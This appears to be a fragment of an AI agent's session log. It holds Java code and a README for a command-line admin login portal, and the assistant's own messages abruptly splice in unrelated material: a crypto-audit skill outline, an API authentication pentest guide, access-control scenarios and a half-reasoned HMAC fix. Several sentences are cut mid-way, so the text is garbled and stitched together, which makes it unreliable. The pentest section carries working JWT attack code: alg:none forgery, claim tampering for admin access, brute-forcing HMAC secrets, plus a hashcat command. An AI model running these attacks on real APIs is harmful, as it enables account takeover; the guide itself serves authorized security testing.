    return false;\n    }\n\n    /** Session check plus the supervisor role check. */\n    private boolean mayManage(String what) throws IOException {\n        if (!requireSession(what)) {\n            return false;\n        }\n        if (Roles.mayManageAccounts(session.role())) {\n            return true;\n        }\n        refuse(what, \"only a supervisor may do that.\");\n        return false;\n    }\n\n    private void closeSession(String notice) throws IOException {\n        if (session != null) {\n            record(\"SESSION_CLOSE\", session.username(), \"bye\");\n        }\n        session = null;\n        out.println(notice);\n    }\n\n    private void refuse(String what, String reason) throws IOException {\n        record(\"COMMAND_DENIED\", session == null ? \"-\" : session.username(), what + \": \" + reason);\n        out.println(\"refused: \" + reason);\n    }\n\n    /** @return false when the record could not be written */\n    private boolean record(String event, String subject, String detail) {\n        try {\n            audit.record(event, subject, detail);\n            return true;\n        } catch (IOException cannotRecord) {\n            out.println(\"refused: the action could not be recorded (\"\n                    + safeMessage(cannotRecord) + \").\");\n            return false;\n        }\n    }\n\n    protected String ask(String prompt) {\n        out.print(prompt);\n        out.flush();\n        try {\n            return readLine();\n        } catch (IOException readFailed) {\n            return null;\n        }\n    }\n\n On a terminal {@link ConsolePortal} hides them.\n     */\n    protected char[] askSecret(String prompt) {\n        out.print(prompt);\n        out.flush();\n        try {\n            String line = readLine();\n            return line == null ? new char[0] : line.toCharArray();\n        } catch (IOException readFailed) {\n            return new char[0];\n        }\n    }\n\n    private String readLine() throws IOException {\n        if (reader == null) {\n            return null;\n        }\n        StringBuilder sb = new StringBuilder(64);\n        int c;\n        while ((c = reader.read()) != -1) {\n            if (c == '\\n') {\n                return sb.toString();\n            }\n            if (c != '\\r') {\n                sb.append((char) c);\n            }\n        }\n        return sb.length() == 0 ? null : sb.toString();\n    }\n\n    private static String safeMessage(Exception failure) {\n        String message = failure.getMessage();\n        return message == null || message.isBlank()\n                ? failure.getClass().getSimpleName() : AuditLog.clean(message);\n    }\n\n    private String helpText() {\n        return \"\"\"\n                commands records now: \" + audit.tail(500).size());\n        out.println(\"--- end self test ---\");\n    }\n\n    private static String ms(long nanos) {\n        return String.format(Locale.ROOT, \"%.1f ms\", It keeps its\naccounts in a file, remembers nothing in plain text, and writes down every login\nattempt.\n\nWritten for Java 17. No libraries, no build tool, nothing to download: only the\nJava Development Kit.\n\n## What it does\n\n1. It asks for a username, then a password (hidden while you type it).\n2. It checks the password against a stored, salted hash.\n3. If the check passes, you get a session that lasts 15 minutes and can run the\n   administrator commands. If it fails, you are told only that the username or\n   password is not correct.\n4. Every attempt, successful or not, is appended to an audit log.\n\nThe first time you run it there are no accounts at all, so it asks you to create\nthe first supervisor before it will accept any login.\n\n## How to build it, run it and check it\n\n```sh\n# compile\njavac -Xlint:all -Werror -d out $(find src -name '*.java')\n\n# run it (accounts and log go in ~/.admin-portal by default)\njava -cp out portal.AdminPortal\n\n# choose somewhere else for its files\njava -cp out -Dportal.home=/var/lib/admin-portal portal.AdminPortal\n\n# run the checks (compiles again, then reports one line per check)\n./run-checks.sh\n```\n\n`java -cp out portal.AdminPortal self-test` is also available. It creates\nnothing new; it just tries three wrong logins and prints how long each took, so\nyou can see the timing behaviour described below with your own eyes.\n\n## Files\n\n| Path | What it is |\n| --- | --- |\n| `src/portal/AdminPortal.java` | The command line program: prompts, commands, sessions. |\n| `src/portal/LoginService.java` | Verifies a username and password, counts failures, hands out sessions. |\n| `src/portal/Pbkdf2.java` | Turns a password into a hash, and does the same amount of work for refusals. |\n| `src/portal/CredentialStore.java` | Reads and writes the account file atomically. |\n| `src/portal/PasswordPolicy.java` | Rules a new password has to satisfy. |\n| `src/portal/Names.java` | Rules for usernames. |\n| `src/portal/AuditLog.java` | The append-only record of what happened. |\n| `src/portal/Roles.java` | Which role is allowed to do what. |\n| `src/portal/PortalChecks.java` | The checks. Not needed to run the portal. |\n| `run-checks.sh` | Compiles everything and runs the checks. |\n\nIn the directory the portal uses (its \"home\") it keeps two files:\n\n- `credentials.tsv` - one line per account: username, iteration count, salt,\n  hash, role. The password itself is never in this file. The file is created so\n  that only its owner can read or write it.\n- `audit.log` - one line per event: a number, the time, the event, who it was\n  about, and a short note.\n\n## Commands\n\nOnce you are signed in (`help` lists these too). Everything except `help` needs\na live session.\n\n| Command | Who may use it | What it does |\n| --- | --- | --- |\n| `whoami` | anyone signed in | name and role, and when the session ends |\n| `status` | anyone signed in | how many accounts there are and where the files are |\n| `audit [n]` | anyone signed in | the last `n` log records, 20 if you leave `n` out |\n| `admins` | supervisor | list accounts, their roles, and who is locked |\n| `create [name]` | supervisor | add an operator and set their password |\n| `reset [name]` | supervisor | set somebody's new password and clear their lock |\n| `remove [name]` | supervisor | delete an account |\n| `unlock [name]` | supervisor | clear an account's lock early |\n| `logout` | anyone signed in | drop the session, stay connected |\n| `quit` | anyone signed in | close the portal (`exit` works too) |\n\n`remove` refuses to delete the last remaining account, because that would lock\neveryone out of their own portal.\n\n## How it protects the password and the login\n\n**Passwords are stored as salted hashes.** Each account gets its own random\n16-byte salt and its password is stretched with PBKDF2-HMAC-SHA256, 100,000\nrounds, into a 32-byte key. A stolen account file therefore gives an attacker\nnothing they can use directly, and one slow hash per guess makes guessing\nexpensive. When a password is checked the array holding it is overwritten\nimmediately afterwards, whether the check succeeded or not.\n\n**A wrong answer tells you nothing useful.** Whether the username does not\nexist, the account is locked, or the password is simply wrong, the message is the\nsame: *\"the username or password is not correct\"*.\n\n**Answering time is the same in all three cases.** Checking a password takes\nabout 150 milliseconds here, and that cost would be a giveaway: an unknown\nusername could be answered for free, so anyone could sweep through a list of names\nand see which ones have accounts, without ever guessing a password. So the\nbranches that cannot possibly succeed spend the same 150 milliseconds on a\nlook-alike hash that is never compared against anything. A refusal that is\ndeliberately cheap is the *unusable input* one (an empty password, a password\nwith a null character in it), which is answered in well under a millisecond -\nthat is safe because those refusals do not depend on the username at all.\n\n**Failures are counted per account, not globally.** Five wrong tries lock that\none username for 15 minutes; a supervisor can clear the lock early with\n`unlock`. A successful sign-in clears the count. Another administrator keeps\nworking normally while somebody else is locked out.\n\n**Passwords have to be worth storing.** At least 10 characters, no more than\n1024, containing a letter and a digit and drawing on at least three kinds of\ncharacter (upper case, lower case, digits, other), and it must not contain the\nusername. New passwords are typed twice; they are checked *before* you are asked\nto type them a second time, so a rejected password does not swallow the line you\nmeant for the next question.\n\n**Two odd inputs are refused rather than stored, because they would let two\ndifferent passwords unlock the same account:** a password containing a null\ncharacter (the hashing API quietly drops a trailing one) and one with an\nincomplete character in it (the API quietly replaces it with a question mark).\n\n**Usernames are matched ignoring case, and padding is refused, not trimmed.**\n`Alice` and `alice` are the same account, on purpose. But `alice` followed by a\ntab or a newline is *not* `alice`: trimming would quietly turn a mistyped or\ncrafted name into a valid login. Usernames are limited to `a-z`, `0-9`, `.`, `_`\nand `-`, which also keeps them safe to put in the account file and the log.\n\n**Nothing is granted unless it was written down.** A successful login is\nrecorded in the audit log *before* access is given. If the log cannot be written\n- the disk is full, the path is broken - the login is refused with *\"access\nrefused: the login could not be recorded\"*. A portal that cannot tell you who\ncame in is not one worth opening. The same rule applies to `create`, `reset`,\n`remove` and `unlock`.\n\n**The log cannot be forged by its own input.** Text that arrives from user input\nis written with any newline or tab replaced by `?` and any over-long field cut\nshort, so nobody can end a record early and append a fake one, or use the log to\nspeak terminal control codes at whoever reads it.\n\n**A damaged account file is skipped, not trusted.** A row whose salt or hash has\nthe wrong length, whose iteration count is absurd, or whose role is unknown is\ncounted and ignored; the portal starts with the remaining rows and `status`\nreports how many were unreadable. The file is rewritten through a temporary file\nand moved into place, so a crash mid-write cannot leave a half-written account\nfile.\n\n## What was actually verified\n\n`./run-checks.sh` runs 111 checks and finishes in about 15 seconds. All 111 pass.\n95 of them drive the classes directly in one process; the other 16 start the real\nprogram as a separate process with piped input, because answering questions in\nmemory does not reproduce how a terminal consumes lines one at a time.\n\nThe checks cover, among others: the right password is accepted and a wrong one\nis not; the wrong password and an unknown username produce the *same* sentence\nfrom the real command line program; a padded username is refused instead of\ntrimmed; a null character in a password cannot smuggle a login through; the file\ncontains no plaintext and can only be read by its owner; a genuine account stops\nworking if an attacker swaps its stored hash; the failure count locks one account\nand leaves the others alone; hostile text cannot forge a second log record; and\nwhen the log cannot be written, nothing is granted.\n\nThe timing claims are checked by measuring each branch three times and insisting\nthat all four branches land within a factor of two of each other, while an\nunusable password must come back at least ten times faster. Measured once on this\nmachine by `self-test`: wrong password 149.9 ms, unknown username 149.7 ms,\nunusable password 0.2 ms.\n\nChecks that pass by accident are the real risk, so 10 deliberate defects were\nintroduced one at a time and the suite re-run each time: drop the equal-cost work\nfrom the unknown-username branch, from the bad-username branch and from the\nlocked-account branch (three defects); let one failure lock every account; grant\naccess even when the log write failed; accept a null character inside a password;\ntrim usernames instead of refusing them; write log fields unfiltered; compare keys\nwith a shortcutting comparison; let every role manage accounts. The checks noticed\nevery one (10 caught, 0 missed, no compile failures, no runner errors). Between one\nand five checks failed per defect, and the failure named the broken behaviour.\n\nTwo of those deserve a note. The shortcutting key comparison changes no\nobservable behaviour at all, so the only honest way to pin it is a check that\nreads the source text of that one method and insists it uses the constant-time\ncomparison - with a companion check that the method was found in the first place,\nso the guard cannot pass on an empty capture. And when the log-filtering defect\nwas inserted, the suite caught it but then stopped early with an\narray-out-of-bounds error inside the checks themselves: the forged record had\nfewer fields than the next check expected. It was still a clear failure, only a\nnoisier one than it should be.\n\nOne limitation is stated plainly rather than tested away: `create` always makes an\n`operator` and the bootstrap makes a `supervisor`, so the third role, `auditor`,\ncan only appear if the account file is edited by hand. Its permissions are\ndefined and checked, but no command can produce it.\n\n## Known limits\n\n- **One process at a time.** The account file is read at start-up and rewritten\n  whole. Two portals sharing one home directory will overwrite each other's\n  changes. There is no file locking.\n- **Locks live in memory.** Restarting the portal clears every lock, deliberately\n  simple, but it also means a restart is an escape hatch.\n- **The account file must be protected by the operating system.** Everything here\n  assumes nobody else can read it; run the portal as a dedicated user and keep\n  the directory owner-only.\n- **The audit log is append-only by convention.** It is not signed or chained, so\n  someone who can write that file can add records (they cannot use user input to\n  do it, and they cannot make a record look like two). Rotate and ship it\n  elsewhere if you need real evidence.\n- **No limit on username guessing across accounts.** Locks are per username, so\n  spreading attempts over many names is not slowed down. Put a rate limit in\n  front of it if it is ever reachable over a network.\n- **Piped input is not private.** When standard input is not a terminal, passwords\n  arrive as plain lines from whatever is feeding the pipe. On a real terminal the\n  password is hidden by the console.\n- **Timing results are statistical.** The equal-cost checks use ratios on a\n  loaded machine; they are sound as a regression guard, not as a claim about your\n  hardware.\n\n## Passwords used by the checks\n\nThe checks create throwaway accounts in a temporary directory and delete them\nagain. Those passwords (`Alice-Passw0rd-1`, `Bob-Passw0rd-22` and the ones in\n`PortalChecks.java`) are visible in this repository and exist only to make the\nchecks reproducible. Never reuse one of them, and never point the portal's home\ndirectory at anything you care about while running the checks.\n"}]}},{"type":"assistant","uuid":"494a35ac-4889-4ff9-8374-b3c60d4c0d61","session_id":"f7339d64-09c0-42bf-8914-e188dfc2397f","parent_tool_use_id":null,"message":{"id":"494a35ac-4889-4ff9-8374-b3c60d4c0d61","type":"message","role":"assistant","model":"vllm-general","content":[{"type":"text","text":"Now let me read the rest of PortalChecks.java (lines 520-849) and run-checks.sh. This skill covers building an automated crypto audit tool that scans Python and configuration files for common cryptographic weaknesses.\n\n\n## When to Use\n\n- When conducting security assessments that involve performing cryptographic audit of application\n- When following incident response procedures for related security events\n- When performing scheduled security testing or auditing activities\n- When validating security controls through hands-on testing\n\n## Prerequisites\n\n- Familiarity with cryptography concepts and tools\n- Access to a test or lab environment for safe execution\n- Python 3.8+ with required dependencies installed\n- Appropriate authorization for any testing activities\n\n## Objectives\n\n- Detect usage of deprecated algorithms (MD5, SHA-1, DES, RC4)\n- Identify insecure cipher modes (ECB) and padding schemes\n- Find hardcoded keys, passwords, and secrets in source code\n- Verify TLS/SSL configuration strength\n- Check key derivation function parameters\n- Validate random number generator usage\n- Produce a structured audit report with findings and remediation\n\n## Key Concepts\n\n### Cryptographic Weakness Categories\n\n| Category | Examples | Risk Level |\n|----------|----------|------------|\n| Weak Hashing | MD5, SHA-1 for integrity/signatures | High |\n| Insecure Encryption | DES, 3DES, RC4, Blowfish | High |\n| Bad Cipher Mode | ECB mode for any block cipher | High |\n| Insufficient Key Size | RSA < 2048, AES-128 for long-term | Medium |\n| Hardcoded Secrets | Keys/passwords in source code | Critical |\n| Weak KDF | Low iteration PBKDF2, plain MD5 | High |\n| Poor Entropy | time-based seeds, predictable IVs | High |\n| Deprecated Protocols | SSLv3, TLS 1.0, TLS 1.1 | High |\n\n## Security Considerations\n\n- Review both application code and configuration files\n- Check third-party dependencies for known crypto vulnerabilities\n- Verify certificates and TLS configurations on deployed servers\n- Ensure secrets are loaded from environment variables or vaults\n- Review key storage and rotation practices\n\n## Validation Criteria\n\n- [ ] Scanner detects all injected test weaknesses\n- [ ] MD5/SHA-1 usage for security purposes is flagged\n- [ ] ECB mode usage is flagged\n- [ ] Hardcoded keys/passwords are detected\n- [ ] Weak KDF parameters are identified\n- [ ] Report includes severity, Authentication testing involves attempting to bypass security controls.\n\n## Prerequisites\n\n- Written authorization specifying target API and authentication mechanisms in scope\n- Valid test credentials for at least two user roles (regular user, admin)\n- Burp Suite Professional with JWT-related extensions (JSON Web Tokens, JWT Editor)\n- Python 3.10+ with `requests`, `PyJWT`, and `jwt` Identification\n\n```python\nimport requests\nimport json\n\nBASE_URL = \"https://target-api.example.com/api/v1\"\n\n# Probe the API to identify authentication mechanisms\nauth_indicators = {\n False,\n}\n\n# Test 1: Check unauthenticated access\nresp = requests.get(f\"{BASE_URL}/users/me\")\nprint(f\"Unauthenticated: {resp.status_code}\")\nif resp.status_code == 200:\n    print(\"[CRITICAL] Endpoint accessible without authentication\")\n\n# Test 2: Check WWW-Authenticate header\nif \"WWW-Authenticate\" in resp.headers:\n    scheme = resp.headers[\"WWW-Authenticate\"]\n    print(f\"Auth scheme advertised: {scheme}\")\n    if \"Bearer\" in scheme:\n        auth_indicators[\"jwt_bearer\"] = True\n    elif \"Basic\" in scheme:\n        auth_indicators[\"basic_auth\"] = True\n\n# Test 3: Login and examine tokens\nlogin_resp = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": \"testuser@example.com\", \"password\": \"TestPass123!\"})\n\nif login_resp.status_code == 200:\n    login_data = login_resp.json()\n    # Check for JWT tokens\n    for key in [\"token\", \"access_token\", \"jwt\", \"id_token\"]:\n        if key in login_data:\n            token = login_data[key]\n            if token.count('.') == 2:\n                auth_indicators[\"jwt_bearer\"] = True\n                print(f\"JWT found in response field: {key}\")\n    # Check for refresh tokens\n    for key in [\"refresh_token\", \"refresh\"]:\n        if key in login_data:\n            print(f\"Refresh token found in field: {key}\")\n    # Check for session cookies\n    for cookie in login_resp.cookies:\n        print(f\"Cookie set: {cookie.name} = {cookie.value[:20]}...\")\n        if \"session\" in cookie.name.lower():\n            auth_indicators[\"session_cookie\"] = True\n\nprint(f\"\\nAuthentication mechanisms detected: {[k for k,v in auth_indicators.items() if v]}\")\n```\n\n### Step 2: Unauthenticated Endpoint Discovery\n\n```python\n# Test all endpoints Analysis\n\n```python\nimport base64\nimport json\nimport hmac\nimport hashlib\n\ndef decode_jwt_parts(token):\n    \"\"\"Decode JWT header and payload without verification.\"\"\"\n    parts = token.split('.')\n    if len(parts) != 3:\n        return None, None\n\n    def pad_base64(s):\n        return s + '=' * (4 - len(s) % 4)\n\n    header = json.loads(base64.urlsafe_b64decode(pad_base64(parts[0])))\n    payload = json.loads(base64.urlsafe_b64decode(pad_base64(parts[1])))\n    return header, payload\n\n# Analyze the JWT token\ntoken = indent=2)}\")\n\n# Security checks\nissues = []\n\n# Check 1: Algorithm\nif header.get(\"alg\") == \"none\":\n    issues.append(\"CRITICAL: Algorithm set to 'none' - token signature not verified\")\nif header.get(\"alg\") in (\"HS256\", \"HS384\", \"HS512\"):\n    issues.append(\"INFO: Symmetric algorithm used - check for weak/default secrets\")\n\n# Check 2: Expiration\nif \"exp\" not in payload:\n    issues.append(\"HIGH: No expiration claim (exp) - token never expires\")\nelse:\n    import time\n    exp_time = payload[\"exp\"]\n    ttl = exp_time - time.time()\n    if ttl > 86400:\n        issues.append(f\"MEDIUM: Token TTL is {ttl/3600:.0f} hours - excessively long\")\n\n# Check 3: Sensitive data in payload\nsensitive_fields = [\"password\", \"ssn\", \"credit_card\", \"secret\", \"private_key\"]\nfor field in sensitive_fields:\n    if field in payload:\n        issues.append(f\"HIGH: Sensitive field '{field}' in JWT payload\")\n\n# Check 4: Missing claims\nexpected_claims = [\"iss\", \"aud\", \"exp\", \"iat\", \"sub\"]\nmissing = [c for c in expected_claims if c not in payload]\nif missing:\n    issues.append(f\"MEDIUM: Missing standard claims: {missing}\")\n\n# Check 5: Key ID\nif \"kid\" in header:\n    kid = header[\"kid\"]\n    # Test for path traversal in kid\n    issues.append(f\"INFO: Key ID (kid) present: {kid} - test for injection\")\n\nfor issue in issues:\n    print(f\"  [{issue.split(':')[0]}] {issue}\")\n```\n\n### Step 4: JWT Manipulation Attacks\n\n```python\n# Attack 1: Remove signature (alg: none)\ndef forge_none_algorithm(token):\n    \"\"\"Create a token with alg:none to bypass signature verification.\"\"\"\n    parts = token.split('.')\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    header['alg'] = 'none'\n    new_header = base64.urlsafe_b64encode(\n        json.dumps(header).encode()).decode().rstrip('=')\n    # Variations of the none algorithm\n    return [\n        f\"{new_header}.{parts[1]}.\",\n        f\"{new_header}.{parts[1]}.{parts[2]}\",\n        f\"{new_header}.{parts[1]}.e30\",\n    ]\n\n# Attack 2: Modify claims without re-signing\ndef forge_payload(token, modifications):\n    \"\"\"Modify payload claims and test if server validates signature.\"\"\"\n    parts = token.split('.')\n    payload = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    payload_data = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))\n    payload_data.update(modifications)\n    new_payload = base64.urlsafe_b64encode(\n        json.dumps(payload_data).encode()).decode().rstrip('=')\n    return f\"{parts[0]}.{new_payload}.{parts[2]}\"\n\n# Attack 3: Brute force weak HMAC secrets\nCOMMON_JWT_SECRETS = [\n    \"secret\", \"password\", \"123456\", \"jwt_secret\", \"supersecret\",\n    \"key\", \"test\", \"admin\", \"changeme\", \"default\",\n    \"your-256-bit-secret\", \"my-secret-key\", \"jwt-secret\",\n    \"s3cr3t\", \"secret123\", \"mysecretkey\", \"apisecret\",\n]\n\ndef brute_force_jwt_secret(token):\n    \"\"\"Try common secrets against HMAC-signed JWTs.\"\"\"\n    parts = token.split('.')\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    if header.get('alg') not in ('HS256', 'HS384', 'HS512'):\n        print(\"Not an HMAC token, skipping brute force\")\n        return None\n\n    signing_input = f\"{parts[0]}.{parts[1]}\".encode()\n    signature = parts[2]\n\n    hash_func = {\n        'HS256': hashlib.sha256,\n        'HS384': hashlib.sha384,\n        'HS512': hashlib.sha512\n    }[header['alg']]\n\n    for secret in COMMON_JWT_SECRETS:\n        expected_sig = base64.urlsafe_b64encode(\n            hmac.new(secret.encode(), signing_input, hash_func).digest()\n        ).decode().rstrip('=')\n        if expected_sig == signature:\n            print(f\"[CRITICAL] JWT secret found: '{secret}'\")\n            return secret\n\n    print(\"No common secrets matched - consider using hashcat/john for extended brute force\")\n    return None\n\n# Test all attacks\nnone_tokens = forge_none_algorithm(token)\nfor none_token in none_tokens:\n    resp = requests.get(f\"{BASE_URL}/users/me\",\n                       headers={\"Authorization\": f\"Bearer {none_token}\"})\n    if resp.status_code == 200:\n        print(f\"[CRITICAL] alg:none bypass successful\")\n\n# Test privilege escalation via claim modification\nadmin_token = forge_payload(token, {\"role\": \"admin\", \"is_admin\": True})\nresp = requests.get(f\"{BASE_URL}/admin/users\",\n                   headers={\"Authorization\": f\"Bearer {admin_token}\"})\nif resp.status_code == 200:\n    print(\"[CRITICAL] JWT claim modification accepted without signature validation\")\n\nbrute_force_jwt_secret(token)\n```\n\n### Step 5: Token Lifecycle Testing\n\n```python\n# Test 1: Token reuse after logout\nlogout_resp = requests.post(f\"{BASE_URL}/auth/logout\",\n    headers={\"Authorization\": f\"Bearer {token}\"})\nprint(f\"Logout: {logout_resp.status_code}\")\n\n# Try to use the token after logout\npost_logout_resp = requests.get(f\"{BASE_URL}/users/me\",\n    headers={\"Authorization\": f\"Bearer {token}\"})\nif post_logout_resp.status_code == 200:\n    print(\"[HIGH] Token still valid after logout - no server-side revocation\")\n\n# Test 2: Token reuse after password change\n# (requires changing password and then testing old token)\n\n# Test 3: Refresh token rotation\nrefresh_token = login_data.get(\"refresh_token\")\nif refresh_token:\n    # Use refresh token\n    refresh_resp = requests.post(f\"{BASE_URL}/auth/refresh\",\n        json={\"refresh_token\": refresh_token})\n    new_tokens = refresh_resp.json()\n\n    # Try to reuse the same refresh token (should fail if rotation is implemented)\n    reuse_resp = requests.post(f\"{BASE_URL}/auth/refresh\",\n        json={\"refresh_token\": refresh_token})\n    if reuse_resp.status_code == 200:\n        print(\"[HIGH] Refresh token reuse allowed - no rotation implemented\")\n\n# Test 4: Token in URL (leakage risk)\nresp = requests.get(f\"{BASE_URL}/users/me?token={token}\")\nif resp.status_code == 200:\n    print(\"[MEDIUM] Token accepted in query parameter - may leak in logs/referrer\")\n```\n\n### Step 6: Password Policy and Credential Testing\n\n```python\n# Test password policy enforcement on registration/change endpoints\nweak_passwords = [\n    \"a\",           # Too short\n    \"password\",    # Common password\n    \"12345678\",    # Numeric only\n    \"abcdefgh\",    # Alpha only, no complexity\n    \"Password1\",   # Meets basic complexity but is common\n    \"\",            # Empty\n    \" \",           # Whitespace\n]\n\nfor pwd in weak_passwords:\n    resp = requests.post(f\"{BASE_URL}/auth/register\",\n        json={\"email\": f\"test_{hash(pwd)%9999}@example.com\",\n              \"password\": pwd, \"name\": \"Test User\"})\n    if resp.status_code in (200, 201):\n        print(f\"[WEAK POLICY] Password accepted: '{pwd}'\")\n\n# Test account enumeration via login response differences\nvalid_email = \"testuser@example.com\"\ninvalid_email = \"nonexistent_user_xyz@example.com\"\n\nresp_valid = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": valid_email, \"password\": \"wrongpassword\"})\nresp_invalid = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": invalid_email, \"password\": \"wrongpassword\"})\n\nif resp_valid.text != resp_invalid.text or resp_valid.status_code != resp_invalid.status_code:\n    print(f\"[MEDIUM] Account enumeration possible:\")\n    print(f\"  Valid user: {resp_valid.status_code} - {resp_valid.text[:100]}\")\n    print(f\"  Invalid user: {resp_invalid.status_code} - {resp_invalid.text[:100]}\")\n```\n\n## Key Concepts\n\n| Term | Definition |\n|------|------------|\n| **Broken Authentication** | OWASP API2:2023 - weaknesses in authentication mechanisms that allow attackers to assume identities of legitimate users |\n| **JWT (JSON Web Token)** | Self-contained token format with header.payload.signature structure, used for stateless API authentication |\n| **Token Revocation** | Server-side mechanism to invalidate tokens before their expiration, critical for logout and password change |\n| **Credential Stuffing** | Automated attack using leaked username/password pairs against authentication endpoints |\n| **Account Enumeration** | Determining valid usernames through different error messages or response times for valid vs invalid accounts |\n| **Refresh Token Rotation** | Security practice where each use of a refresh token generates a new one, preventing token reuse attacks |\n\n## Tools & Systems\n\n- **Burp Suite JWT Editor**: Extension for decoding, editing, and re-signing JWT tokens with various attack modes\n- **jwt_tool**: Python tool for JWT testing with 12+ attack modes including alg:none, key confusion, and JWKS spoofing\n- **hashcat**: GPU-accelerated password cracker supporting JWT HMAC secret brute-forcing (mode 16500)\n- **Hydra**: Network login brute-forcer supporting HTTP form-based and API authentication testing\n- **Nuclei**: Template-based scanner with authentication bypass detection templates\n\n## Common Scenarios\n\n### Scenario: SaaS Platform API Authentication Assessment\n\n**Context**: A SaaS platform uses JWT tokens for API authentication. The JWT is issued upon login and used for all subsequent API calls. A refresh token mechanism is also implemented.\n\n**Approach**:\n1. Authenticate and capture the JWT: algorithm is HS256, expiration is 7 days, payload contains user role\n2. Test alg:none bypass: server rejects the token (secure)\n3. Brute force the HMAC secret: discover the secret is \"company-jwt-secret-2023\" (found using hashcat with custom wordlist)\n4. Forge a JWT with admin role using the discovered secret: gain admin access to all endpoints\n5. Test token revocation: tokens remain valid after logout and password change (no blacklist)\n6. Test refresh token: refresh token has no expiration and can be reused indefinitely\n7. Find that the password reset endpoint returns different messages for valid vs invalid emails\n8. Discover that the `/health` and `/metrics` endpoints are accessible without authentication\n\n**Pitfalls**:\n- Only testing the login endpoint and missing authentication weaknesses in password reset, MFA, and token refresh flows\n- Not checking if the JWT secret is the same across all environments (dev, staging, production)\n- Ignoring the token lifetime: a 7-day JWT with no revocation means a stolen token is valid for a week\n- Not testing for token leakage in server logs, URL parameters, or error messages\n\n## Output Format\n\n```\n## Finding: JWT HMAC Secret Brute-Forceable and Token Not Revocable\n\n**ID**: API-AUTH-001\n**Severity**: Critical (CVSS 9.1)\n**OWASP API**: API2:2023 - Broken Authentication\n**Affected Components**:\n  - POST /api/v1/auth/login (token issuance)\n  - All authenticated endpoints (token validation)\n  - POST /api/v1/auth/logout (ineffective)\n\n**Description**:\nThe API uses HS256-signed JWT tokens with a brute-forceable secret\n(\"company-jwt-secret-2023\"). An attacker who discovers this secret can\nforge tokens for any user with any role, including admin. Additionally,\ntokens are not revocable - logout does not invalidate the token server-side,\nand the 7-day expiration means stolen tokens remain valid for extended periods.\n\n**Attack Chain**:\n1. Capture any valid JWT from authenticated session\n2. Brute force the HMAC secret using hashcat: hashcat -a 0 -m 16500 jwt.txt wordlist.txt\n3. Secret recovered in 3 minutes: \"company-jwt-secret-2023\"\n4. Forge admin JWT: modify \"role\" claim to \"admin\", re-sign with discovered secret\n5. Access admin endpoints: GET /api/v1/admin/users returns all 50,000 user accounts\n\n**Remediation**:\n1. Replace HS256 with RS256 using a 2048-bit RSA key pair\n2. Use a cryptographically random secret of at least 256 bits if HMAC must be used\n3. Implement token blacklisting using Redis for logout and password change events\n4. Reduce token TTL to 15 minutes with refresh token rotation\n5. Add `iss` and `aud` claims validation to prevent token misuse across services\n```\n"}]}},{"type":"assistant","uuid":"bda06931-43ba-4e72-85d4-940c22995515","session_id":"f7339d64-09c0-42bf-8914-e188dfc2397f","parent_tool_use_id":null,"message":{"id":"bda06931-43ba-4e72-85d4-940c22995515","type":"message","role":"assistant","model":"vllm-general","content":[{"type":"text","text":"Useful Access Control - permissions based on user/resource/environment attributes |\n| **Multi-Tenant Isolation** | Ensuring data and functionality separation between different organizations/tenants |\n| Scenarios\n\n### Scenario 1: Admin Panel Without Auth Check\nThe `/admin/dashboard` endpoint returns the admin panel when accessed with a regular user's session token. The front-end hides the admin menu, but the back-end does not enforce role checks.\n\n### Scenario 2: API Endpoint Missing Authorization\nThe `DELETE /api/users/{id}` endpoint checks for authentication (valid token) but not authorization (admin role). Any authenticated user can delete any other user's account.\n\n### Scenario 3: Tenant Data Leakage\nA SaaS application uses `tenant_id` in API request headers. Changing the `X-Tenant-ID` header to another tenant's ID returns their data, bypassing tenant isolation.\n\n### Scenario 4: Mass Assignment Role Escalation\nThe user profile update endpoint at `PUT /api/users/{id}` accepts a `role` field in the JSON body. Compact fix block:\n\n```java\n    private byte[] macKey() throws IOException {\n        Path keyPath = path.resolveSibling(path.getFileName() + \".key\");\n        if (!Files.exists(keyPath)) {\n            byte[] fresh = new byte[32];\n            new SecureRandom().nextBytes(fresh);\n            Files.write(keyPath, fresh, PosixFilePermissions.asFileAttribute(Set.of(\n                    PosixFilePermission.OWNER_READ, PosixFilePermission.OWNER_WRITE)));\n            return fresh;\n        }\n        return Files.readAllBytes(keyPath);\n    }\n\n    private byte[] mac(byte[] payload) throws GeneralSecurityException, IOException {\n        Mac hmac = Mac.getInstance(\"HmacSHA256\");\n        hmac.init(new SecretKeySpec(macKey(), \"HmacSHA256\"));\n        return hmac.doFinal(payload);\n    }\n```\nAnd save() appends `\\t<base64 mac>` per row, computed over the row bytes; load() recomputes and rejects mismatches (macFailure++). This makes row swaps require the key (protected at 0600, same directory as the data — honestly a local attacker with read access to the data directory can also read the key! The MAC protects against an attacker who can write data but not read… limited. True mitigation = OS perms, which the code already does. Rephrase: primary fix = tighten perms to close SEC-01/04 (root of trust), plus integrity MAC to detect offline tampering by an attacker with write-but-no-read… weak. Alternative honest fix: sign the store with a key outside the directory? A local CLI has no better option. Honest framing: the residual risk is \"anyone who can write credentials.tsv owns the portal\"; that's inherent and documented; mitigations: (a) tighten home to 0700 (already a fix in SEC-04), (b) add per-row HMAC under the same 0700 dir to turn tampering into detection (a swap needs both file writes and… but an attacker with write perms to a 0700 dir has shell as victim). Given this is a local tool, honestly this is \"Medium leaning Low\" — keep Medium (integrity of auth data is assumed by the load() validation code but isn't actually provided; a pentest would report it) and give the MAC fix + perms, explicitly noting the residual.
